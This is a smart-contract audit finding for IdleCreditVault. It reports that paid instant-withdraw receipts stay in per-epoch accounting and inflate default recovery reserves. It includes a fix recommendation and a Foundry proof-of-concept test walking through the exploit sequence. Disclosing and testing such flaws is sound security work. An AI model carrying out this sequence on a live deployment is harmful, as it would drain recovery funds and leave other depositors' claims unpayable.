### Title
Claimed instant-withdraw receipts remain in epoch accounting and inflate default recovery reserves - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`claimInstantWithdrawRequest` clears only the aggregate user receipt, while leaving `instantWithdrawsRequestsByEpoch` and `instantWithdrawClaimsByEpoch` unchanged. A paid receipt is therefore counted again when a later borrower default finalizes recovery for the same epoch, creating phantom recovery basis and phantom prefunded reserves. [1](#0-0) [2](#0-1) 

### Finding Description
When an instant withdrawal is requested, the strategy records the amount in `instantWithdrawsRequests[_user]`, `instantWithdrawsRequestsByEpoch[_user][currentEpoch]`, `instantWithdrawClaimsByEpoch[currentEpoch]`, and `pendingInstantWithdraws`. [3](#0-2) 

Funding decrements `pendingInstantWithdraws`, and a successful claim burns the user's receipt and clears `instantWithdrawsRequests[_user]`. [4](#0-3) [5](#0-4) 

Neither claim path clears `instantWithdrawsRequestsByEpoch[_user][currentEpoch]` nor subtracts the claimed amount from `instantWithdrawClaimsByEpoch[currentEpoch]`. [1](#0-0) 

If another instant request remains unfunded in that epoch when the borrower defaults, `defaultPendingClaimBasis` adds the whole stale epoch claim total, including Alice's already-paid receipt. [2](#0-1) 

`_defaultPrefundedInstantReserve` then treats `instantBasis - pendingInstantWithdraws` as underlying still held by the strategy, even though Alice's portion was already transferred to her. [6](#0-5) 

`finalizeDefaultRecovery` includes that phantom amount in `defaultRecoveryReserve`, computes an inflated `defaultRecoveryPrice`, and may under-burn the CDO's active strategy-token balance. [7](#0-6) 

Recovery claims decrement the accounting reserve and transfer actual underlying, so the absent phantom balance eventually causes later claims to revert. [8](#0-7) 

### Impact Explanation
An unprivileged user can permanently poison recovery accounting by making an instant withdrawal, receiving its funded payout, and leaving its per-epoch receipt basis behind. If any other instant withdrawal remains pending when the epoch defaults, recorded reserves exceed actual strategy holdings by the already-paid amount. [9](#0-8) [5](#0-4) 

For example, if Alice requests and claims 60 USDC while Bob has a 40 USDC unfunded instant request, `instantWithdrawClaimsByEpoch` remains 100 USDC while `pendingInstantWithdraws` is only 40 USDC. Finalization records 60 USDC as prefunded reserve even though that amount left the strategy, and recovery claims can consume the real 40 USDC before subsequent claimants permanently revert. [6](#0-5) [10](#0-9) 

The broken invariant is one receipt, one payout: Alice's receipt is paid once but remains included in epoch claim accounting and default-reserve calculations. [11](#0-10) 

### Likelihood Explanation
This requires a funded instant withdrawal and an unfunded instant withdrawal to coexist in the same strategy epoch before default finalization. An attacker can supply the funded request as an ordinary instant-withdrawal user; the remaining request can belong to the attacker through another address or to any unrelated user. [3](#0-2) 

The CDO-only guard does not prevent the sequence because requests and claims are initiated through the legitimate `IdleCDOEpochVariant` withdrawal interface. No privileged action is needed beyond the normal epoch funding and default-finalization flow. [12](#0-11) [13](#0-12) 

### Recommendation
Clear a user's per-epoch instant receipt whenever it is paid through the funded claim path, and subtract the paid amount from `instantWithdrawClaimsByEpoch`. The cleanup should occur in `claimInstantWithdrawRequest`, alongside the existing aggregate receipt deletion. [5](#0-4) 

A safe implementation should identify the epoch containing the user's open receipt before clearing it, decrement `instantWithdrawClaimsByEpoch[receiptEpoch]` once, delete `instantWithdrawsRequestsByEpoch[_user][receiptEpoch]`, and ensure the defaulted-claim path cannot process a receipt that was already paid. Alternatively, store one receipt record per user and derive both funded and defaulted payment paths from that single record. [11](#0-10) 

### Proof of Concept
Add this test to `test/foundry/IdleCreditVault.t.sol`, which already deploys a forked `IdleCDOEpochVariant` and `IdleCreditVault` fixture. [14](#0-13) 

```solidity
function testClaimedInstantReceiptInflatesDefaultRecovery() public {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    uint256 aliceAmount = 60e6;
    uint256 bobAmount = 40e6;
    uint256 epoch = strategy.epochNumber();

    // Seed two ordinary depositors and enter an epoch.
    _depositWithUser(alice, aliceAmount);
    _depositWithUser(bob, bobAmount);
    vm.prank(manager);
    cdoEpoch.startEpoch();

    // Trigger the existing instant-withdraw path, eg by lowering APR as the
    // fixture already does in its instant-withdrawal tests.
    vm.prank(manager);
    strategy.setApr(_scaleAprWithBuffer(initialProvidedApr / 2));

    vm.prank(alice);
    cdoEpoch.requestWithdraw(0, cdoEpoch.AATranche());
    vm.prank(bob);
    cdoEpoch.requestWithdraw(0, cdoEpoch.AATranche());

    assertEq(strategy.instantWithdrawClaimsByEpoch(epoch), aliceAmount + bobAmount);
    assertEq(strategy.pendingInstantWithdraws(), aliceAmount + bobAmount);

    // Fund and pay only Alice through the normal instant-claim flow.
    deal(address(underlying), address(cdoEpoch), aliceAmount);
    vm.prank(address(cdoEpoch));
    strategy.collectInstantWithdrawFunds(aliceAmount);
    vm.prank(address(cdoEpoch));
    strategy.claimInstantWithdrawRequest(alice);

    assertEq(strategy.instantWithdrawsRequests(alice), 0);
    assertEq(strategy.pendingInstantWithdraws(), bobAmount);

    // BUG: Alice's paid receipt is still present in epoch accounting.
    assertEq(
        strategy.instantWithdrawsRequestsByEpoch(alice, epoch),
        aliceAmount,
        "paid receipt was not cleared"
    );
    assertEq(
        strategy.instantWithdrawClaimsByEpoch(epoch),
        aliceAmount + bobAmount,
        "epoch basis includes paid receipt"
    );

    // Honest borrower default and recovery finalization.
    deal(address(underlying), borrower, 0);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(cdoEpoch.owner());
    cdoEpoch.stopEpoch(0, 0);

    uint256 recovered = bobAmount;
    deal(address(underlying), borrower, recovered);
    vm.startPrank(borrower);
    underlying.approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, borrower);
    vm.stopPrank();

    // The strategy recorded Bob's real recovery plus Alice's phantom paid receipt.
    assertEq(strategy.defaultRecoveryReserve(), recovered + aliceAmount);
    assertEq(underlying.balanceOf(address(strategy)), recovered);

    // Alice's stale defaulted-epoch receipt can consume reserve accounting even
    // though her receipt tokens were already burned by the funded claim.
    vm.prank(address(cdoEpoch));
    strategy.claimInstantWithdrawRequest(alice);

    // Bob's real claim can now fail despite the reserve accounting having
    // appeared solvent: Alice's payout was no longer held by the strategy.
    vm.prank(address(cdoEpoch));
    vm.expectRevert();
    strategy.claimInstantWithdrawRequest(bob);
}
```

The decisive assertion is that `pendingInstantWithdraws` falls to `bobAmount` while `instantWithdrawClaimsByEpoch` remains `aliceAmount + bobAmount`; `_defaultPrefundedInstantReserve` converts exactly that stale difference into a nonexistent reserve. [6](#0-5)

```text
  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
```
